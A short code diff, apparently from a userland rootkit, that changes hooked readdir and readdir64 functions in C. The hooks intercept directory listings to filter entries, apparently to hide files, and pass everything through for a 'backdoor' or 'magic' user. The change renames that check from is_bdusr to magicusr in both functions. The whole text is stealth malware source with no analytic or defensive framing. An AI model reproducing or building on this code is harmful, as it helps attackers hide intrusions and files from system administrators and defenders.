@@ -6,7 +6,7 @@ struct dirent *readdir(DIR *dirp){
     hook(CREADDIR);
 
     while((dir = call(CREADDIR, dirp)) != NULL){
-        if(is_bdusr()) return dir;
+        if(magicusr()) return dir;
 
         if(!strcmp(dir->d_name,".\0") || !strcmp(dir->d_name, "/\0") || !strcmp(dir->d_name, "..\0"))
             continue;
@@ -41,7 +41,7 @@ struct dirent64 *readdir64(DIR *dirp){
     hook(CREADDIR64);
 
     while((dir = call(CREADDIR64, dirp)) != NULL){
-        if(is_bdusr()) return dir;
+        if(magicusr()) return dir;
 
         if(!strcmp(dir->d_name,".\0") || !strcmp(dir->d_name, "/\0") || !strcmp(dir->d_name, "..\0"))
             continue;
